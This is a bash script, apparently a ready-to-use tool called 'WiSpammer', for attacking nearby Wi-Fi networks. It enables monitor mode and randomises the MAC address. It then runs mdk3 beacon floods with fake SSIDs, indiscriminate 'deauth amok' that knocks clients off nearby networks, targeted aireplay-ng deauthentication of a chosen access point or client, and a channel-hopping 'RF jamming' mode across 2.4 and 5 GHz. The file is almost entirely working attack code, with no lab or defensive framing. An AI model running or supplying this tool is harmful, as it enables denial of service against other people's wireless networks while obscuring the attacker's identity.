#!/bin/bash

# Colors
BOLD_WHITE="\e[1;37m"
BOLD_BLUE="\e[1;34m"
BOLD_GREEN="\e[1;32m"
BOLD_RED="\e[1;31m"
RESET="\e[0m"

# Globals
ACTIVE_AD=""
ORIGINAL_AD=""

# ─────────────────────────────────────────────
#  CLEANUP
# ─────────────────────────────────────────────
function exitss() {
    echo -e "\n${BOLD_BLUE} Cleaning up...${RESET}"

    # Kill any tools we may have left running
    pkill -f "mdk3" > /dev/null 2>&1
    pkill -f "aireplay-ng" > /dev/null 2>&1
    pkill -f "airodump-ng" > /dev/null 2>&1

    if [ -n "$ACTIVE_AD" ]; then
        # Stop monitor mode properly
        if command -v airmon-ng &> /dev/null; then
            echo -e "${BOLD_BLUE} [!] Stopping monitor mode on $ACTIVE_AD...${RESET}"
            airmon-ng stop "$ACTIVE_AD" > /dev/null 2>&1
        fi
    fi

    if [ -n "$ORIGINAL_AD" ]; then
        echo -e "${BOLD_BLUE} [!] Restoring $ORIGINAL_AD...${RESET}"
        ip link set "$ORIGINAL_AD" down > /dev/null 2>&1
        macchanger -p "$ORIGINAL_AD" > /dev/null 2>&1
        iwconfig "$ORIGINAL_AD" mode managed > /dev/null 2>&1
        ip link set "$ORIGINAL_AD" up > /dev/null 2>&1
        nmcli device set "$ORIGINAL_AD" managed yes > /dev/null 2>&1
        nmcli device connect "$ORIGINAL_AD" > /dev/null 2>&1
    fi

    rm -f random.txt .conf > /dev/null 2>&1
    echo -e "${BOLD_GREEN} Done. I hope you enjoyed!${RESET}"
    exit 0
}

trap exitss INT TERM

# ─────────────────────────────────────────────
#  TITLE
# ─────────────────────────────────────────────
function title() {
    clear
    if command -v figlet &> /dev/null; then
        figlet wispammer
    else
        echo -e "${BOLD_GREEN}=== WiSpammer ===${RESET}"
    fi
    echo -e "${BOLD_WHITE}                                           By NacreousDawn596  ${RESET}"
    echo " "
}

# ─────────────────────────────────────────────
#  INTERFACE SETUP  (sets globals ACTIVE_AD, ORIGINAL_AD)
# ─────────────────────────────────────────────
function setup_interface() {
    local iface="$1"
    ORIGINAL_AD="$iface"

    echo -e "${BOLD_BLUE} [!] Preparing interface $iface...${RESET}"

    # Release from NetworkManager
    nmcli device set "$iface" managed no > /dev/null 2>&1
    nmcli device disconnect "$iface" > /dev/null 2>&1

    # Kill interfering processes
    if command -v airmon-ng &> /dev/null; then
        echo -e "${BOLD_BLUE} [!] Killing interfering processes...${RESET}"
        airmon-ng check kill > /dev/null 2>&1
    fi
    pkill wpa_supplicant > /dev/null 2>&1
    pkill dhclient > /dev/null 2>&1
    rfkill unblock wifi > /dev/null 2>&1
    sleep 1

    # Enable monitor mode
    echo -e "${BOLD_BLUE} [!] Enabling monitor mode...${RESET}"
    if command -v airmon-ng &> /dev/null; then
        airmon-ng start "$iface" > /dev/null 2>&1
        sleep 1
        # Detect renamed interface (e.g. wlan0mon)
        if ip link show "${iface}mon" &> /dev/null 2>&1; then
            ACTIVE_AD="${iface}mon"
        else
            # Some drivers keep the same name but switch mode
            ACTIVE_AD="$iface"
        fi
    else
        # Fallback: manual
        ip link set "$iface" down > /dev/null 2>&1
        if ! iwconfig "$iface" mode monitor 2>/dev/null; then
            echo -e "${BOLD_RED} [!] Error: Could not set monitor mode.${RESET}"
            return 1
        fi
        ip link set "$iface" up > /dev/null 2>&1
        ACTIVE_AD="$iface"
    fi

    # Verify monitor mode is actually active
    local mode
    mode=$(iwconfig "$ACTIVE_AD" 2>/dev/null | grep -i "mode:monitor")
    if [ -z "$mode" ]; then
        echo -e "${BOLD_RED} [!] Warning: Interface may not be in monitor mode. Proceeding anyway...${RESET}"
    fi

    echo -e "${BOLD_GREEN} [!] Active interface: $ACTIVE_AD${RESET}"

    # Randomize MAC
    echo -e "${BOLD_BLUE} [!] Randomizing MAC on $ACTIVE_AD...${RESET}"
    ip link set "$ACTIVE_AD" down > /dev/null 2>&1
    macchanger -r "$ACTIVE_AD" > /dev/null 2>&1 || echo -e "${BOLD_RED} [!] Warning: MAC change failed (non-fatal).${RESET}"
    ip link set "$ACTIVE_AD" up > /dev/null 2>&1
    sleep 2

    # Final UP check
    if ! ip link show "$ACTIVE_AD" 2>/dev/null | grep -q "UP"; then
        ip link set "$ACTIVE_AD" up > /dev/null 2>&1
        sleep 1
        if ! ip link show "$ACTIVE_AD" 2>/dev/null | grep -q "UP"; then
            echo -e "${BOLD_RED} [!] Error: Interface $ACTIVE_AD failed to come UP.${RESET}"
            return 1
        fi
    fi

    return 0
}

# ─────────────────────────────────────────────
#  SET CHANNEL  (uses iw, falls back to iwconfig)
# ─────────────────────────────────────────────
function set_channel() {
    local iface="$1"
    local chan="$2"
    if command -v iw &> /dev/null; then
        iw dev "$iface" set channel "$chan" > /dev/null 2>&1 || \
        iwconfig "$iface" channel "$chan" > /dev/null 2>&1
    else
        iwconfig "$iface" channel "$chan" > /dev/null 2>&1
    fi
}

# ─────────────────────────────────────────────
#  RF JAMMING  (mdk3 has no 'j'; we simulate it)
#  Runs beacon flood + deauth simultaneously on
#  all common 2.4 GHz + 5 GHz channels, hopping.
# ─────────────────────────────────────────────
function rf_jam() {
    local iface="$1"
    local tmplist="/tmp/wispammer_jam_ssids.txt"

    echo -e "${BOLD_BLUE} [!] Building jammer SSID list...${RESET}"
    > "$tmplist"
    for i in $(seq 1 200); do
        printf "JAM%04d\n" "$i" >> "$tmplist"
    done

    # Channels to cycle: 2.4 GHz (1-13) + 5 GHz common (36,40,44,48,149,153,157,161)
    local channels=(1 6 11 2 7 12 3 8 13 4 9 5 10 36 40 44 48 149 153 157 161)

    echo -e "${BOLD_RED} [!] Starting RF Jamming (beacon flood + deauth cycling channels)...${RESET}"
    echo -e "${BOLD_WHITE} Press CTRL+C to stop.${RESET}"
    echo " "

    # Run beacon flood in background
    mdk3 "$iface" b -f "$tmplist" -a -s 1000 &
    local mdk_beacon_pid=$!

    # Run deauth amok in background
    mdk3 "$iface" d &
    local mdk_deauth_pid=$!

    # Channel hopper — keeps switching the interface channel
    while true; do
        for ch in "${channels[@]}"; do
            set_channel "$iface" "$ch"
            sleep 0.3
        done
    done

    # Cleanup (reached only after CTRL+C via trap)
    kill "$mdk_beacon_pid" "$mdk_deauth_pid" > /dev/null 2>&1
    rm -f "$tmplist"
}

# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────
title
echo -e "${BOLD_WHITE} made by NacreousDawn596${RESET}"
sleep 1

# Detect wireless interfaces
WIFI_INTERFACES=$(iwconfig 2>&1 | grep "IEEE 802.11" | awk '{print $1}')

if [ -z "$WIFI_INTERFACES" ]; then
    echo -e "${BOLD_RED} [!] No wireless interfaces detected!${RESET}"
    echo -e "${BOLD_WHITE} Available interfaces:${RESET}"
    ip -br link show | awk '{print "   "$1}'
else
    echo -e "${BOLD_BLUE}   Your wireless interfaces:${RESET}"
    echo -e "${BOLD_WHITE}"
    for iface in $WIFI_INTERFACES; do
        echo "   $iface"
    done
    echo -e "${RESET}"
fi

echo " "
echo -n -e "${BOLD_GREEN}   Type your wireless interface > ${BOLD_WHITE}"
read -r AD
echo -e "${RESET}"

if [ -z "$AD" ]; then
    echo -e "${BOLD_RED} Invalid interface.${RESET}"
    exit 1
fi

# Validate interface exists
if ! ip link show "$AD" &> /dev/null; then
    echo -e "${BOLD_RED} [!] Interface $AD not found.${RESET}"
    exit 1
fi

title

echo -e "${BOLD_GREEN}  Choose an option:${RESET}"
echo " "
echo -e "${BOLD_GREEN}  1.${BOLD_WHITE} Custom SSID prefix + count (beacon flood)"
echo -e "${BOLD_GREEN}  2.${BOLD_WHITE} Use your own SSID wordlist file"
echo -e "${BOLD_GREEN}  3.${BOLD_WHITE} Random SSID wordlist (beacon flood)"
echo -e "${BOLD_GREEN}  4.${BOLD_WHITE} Deauthentication Amok Mode (MDK3)"
echo -e "${BOLD_GREEN}  5.${BOLD_WHITE} Targeted Deauthentication (Aireplay-ng)"
echo -e "${BOLD_GREEN}  6.${BOLD_WHITE} RF Jamming (beacon flood + deauth, all channels)"
echo -e "${RESET}"
echo -n -e "${BOLD_GREEN}  > ${BOLD_WHITE}"
read -r user_input
echo -e "${RESET}"

# ── Option 1: Custom SSID beacon flood ───────
if [ "$user_input" == "1" ]; then
    setup_interface "$AD" || exit 1
    title

    echo -n -e "${BOLD_GREEN} Enter SSID prefix > ${BOLD_WHITE}"
    read -r WORD
    echo -n -e "${BOLD_GREEN} How many SSIDs? > ${BOLD_WHITE}"
    read -r N
    echo -e "${RESET}"

    local_list="/tmp/wispammer_custom.txt"
    > "$local_list"
    for i in $(seq 1 "$N"); do
        echo "$WORD $i" >> "$local_list"
    done

    echo -e "${BOLD_BLUE} Starting beacon flood on $ACTIVE_AD...${RESET}"
    echo " Press CTRL+C to stop."
    echo " "
    mdk3 "$ACTIVE_AD" b -f "$local_list" -a -s 1000
    rm -f "$local_list"
    exitss

# ── Option 2: Custom wordlist file ───────────
elif [ "$user_input" == "2" ]; then
    setup_interface "$AD" || exit 1
    title

    echo -n -e "${BOLD_GREEN} Path to your SSID wordlist file > ${BOLD_WHITE}"
    read -r OWN
    echo -e "${RESET}"

    if [ ! -f "$OWN" ]; then
        echo -e "${BOLD_RED} [!] File not found: $OWN${RESET}"
        exitss
    fi

    LINE_COUNT=$(wc -l < "$OWN")
    echo -e "${BOLD_BLUE} Starting beacon flood on $ACTIVE_AD ($LINE_COUNT SSIDs)...${RESET}"
    echo " Press CTRL+C to stop."
    mdk3 "$ACTIVE_AD" b -f "$OWN" -a -s "$LINE_COUNT"
    exitss

# ── Option 3: Random SSIDs ───────────────────
elif [ "$user_input" == "3" ]; then
    setup_interface "$AD" || exit 1
    title

    echo -n -e "${BOLD_GREEN} How many random SSIDs? > ${BOLD_WHITE}"
    read -r N
    echo -e "${RESET}"

    local_list="/tmp/wispammer_random.txt"
    > "$local_list"

    if command -v pwgen &> /dev/null; then
        pwgen 14 "$N" | tr ' ' '\n' >> "$local_list"
    else
        # fallback without pwgen
        for i in $(seq 1 "$N"); do
            tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 14 >> "$local_list"
            echo "" >> "$local_list"
        done
    fi

    echo -e "${BOLD_GREEN} Starting beacon flood on $ACTIVE_AD...${RESET}"
    echo " Press CTRL+C to stop."
    echo " "
    mdk3 "$ACTIVE_AD" b -f "$local_list" -a -s "$N"
    rm -f "$local_list"
    exitss

# ── Option 4: Deauth Amok Mode ───────────────
elif [ "$user_input" == "4" ]; then
    title
    echo -e "${BOLD_BLUE} [!] Scanning networks in range...${RESET}"
    echo " "
    nmcli -f "SSID,CHAN,SIGNAL,BARS" -c no d wifi list 2>/dev/null || \
        echo -e "${BOLD_RED} [!] nmcli scan failed — list may be empty${RESET}"
    echo " "

    echo -n -e "${BOLD_GREEN} Channel(s) to target (space-separated, or ENTER for all) > ${BOLD_WHITE}"
    read -r -a CHANNELS
    echo -e "${RESET}"

    setup_interface "$AD" || exit 1
    title

    echo -e "${BOLD_RED} [!] WARNING: This disconnects clients from nearby networks.${RESET}"
    echo -e "${BOLD_BLUE} Starting Deauth Amok Mode on $ACTIVE_AD...${RESET}"
    echo " Press CTRL+C to stop."
    echo " "

    if [ "${#CHANNELS[@]}" -eq 0 ]; then
        # No channel filter — hit everything
        mdk3 "$ACTIVE_AD" d
    else
        # Build -c flags: one per channel
        chan_args=()
        for ch in "${CHANNELS[@]}"; do
            chan_args+=(-c "$ch")
        done
        mdk3 "$ACTIVE_AD" d "${chan_args[@]}"
    fi
    exitss

# ── Option 5: Targeted Deauth ─────────────────
elif [ "$user_input" == "5" ]; then
    setup_interface "$AD" || exit 1
    title

    echo -e "${BOLD_BLUE} [!] Launching airodump-ng — press CTRL+C when you spot your target.${RESET}"
    sleep 3

    trap "" INT
    airodump-ng "$ACTIVE_AD"
    trap exitss INT TERM

    echo " "
    echo -n -e "${BOLD_GREEN} Target BSSID > ${BOLD_WHITE}"
    read -r TARGET_BSSID
    echo -n -e "${BOLD_GREEN} Target Channel > ${BOLD_WHITE}"
    read -r TARGET_CHAN
    echo -n -e "${BOLD_GREEN} Client MAC (optional, ENTER to skip) > ${BOLD_WHITE}"
    read -r TARGET_CLIENT
    echo -e "${RESET}"

    if [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_CHAN" ]; then
        echo -e "${BOLD_RED} [!] BSSID and channel are required.${RESET}"
        exitss
    fi

    # Lock to target channel using iw (works in monitor mode)
    echo -e "${BOLD_BLUE} [!] Setting channel $TARGET_CHAN on $ACTIVE_AD...${RESET}"
    set_channel "$ACTIVE_AD" "$TARGET_CHAN"
    sleep 1

    title
    if [ -z "$TARGET_CLIENT" ]; then
        echo -e "${BOLD_RED} [!] WARNING: Disconnecting ALL clients from $TARGET_BSSID.${RESET}"
        echo -e "${BOLD_BLUE} Starting broadcast deauth on $ACTIVE_AD...${RESET}"
        echo " "
        aireplay-ng -0 0 -a "$TARGET_BSSID" "$ACTIVE_AD"
    else
        echo -e "${BOLD_RED} [!] WARNING: Disconnecting $TARGET_CLIENT from $TARGET_BSSID.${RESET}"
        echo -e "${BOLD_BLUE} Starting targeted deauth on $ACTIVE_AD...${RESET}"
        echo " "
        aireplay-ng -0 0 -a "$TARGET_BSSID" -c "$TARGET_CLIENT" "$ACTIVE_AD"
    fi
    exitss

# ── Option 6: RF Jamming ──────────────────────
elif [ "$user_input" == "6" ]; then
    setup_interface "$AD" || exit 1
    title

    echo -e "${BOLD_RED} [!] WARNING: This jams WiFi across all channels.${RESET}"
    rf_jam "$ACTIVE_AD"
    exitss

else
    echo -e "${BOLD_RED} Invalid option.${RESET}"
    exit 1
fi